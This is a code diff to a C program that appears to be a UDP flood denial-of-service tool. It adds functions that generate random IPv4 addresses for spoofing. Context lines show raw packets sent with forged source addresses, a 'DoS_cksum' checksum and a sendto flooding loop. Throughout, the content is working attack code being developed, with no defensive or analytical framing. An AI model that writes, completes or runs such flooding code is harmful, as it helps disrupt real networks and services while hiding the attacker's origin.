@@ -88,6 +88,21 @@ int random_int(int min, int max)
 	return min+(s_seed ^ s_seed>>15)%(max-min+1);
 }
 
+unsigned long random_lip(void)
+{
+	char convi[16];
+	sprintf (convi, "%d.%d.%d.%d", random_int(1, 254), random_int(1, 254), random_int(1, 254), random_int(1, 254));
+	return inet_addr (convi);
+}
+
+char *
+random_cip (void)
+{
+  struct in_addr hax0r;
+  hax0r.s_addr = random_lip();
+  return (inet_ntoa (hax0r));
+}
+
 static inline long myrandom(int begin,int end){//根据不同的种子，随机出不同的数
  int gap=end-begin+1;
  int ret=0;
@@ -247,9 +262,8 @@ int main(void)
 		src.s_addr = (unsigned long)myrandom(0,65535); /* source address */
 		udp.ipH.ip_src = src;    
 		udp.ipH.ip_sum = DoS_cksum((unsigned short*)&udp.ipH,sizeof(udp.ipH));//检验和
-        if( sendto( s , &udp , pksize  , 0 , ( struct sockaddr *) &sin , sizeof(struct sockaddr)) == -1 )
+        if( sendto( s , &udp , pksize  , 0 , ( struct sockaddr *) &sin , sizeof(sin)) < 0 )
         {
-
             printf("[-]Error to sendto : %s[%d].\n" , strerror(errno), errno );
             return 1;
         }
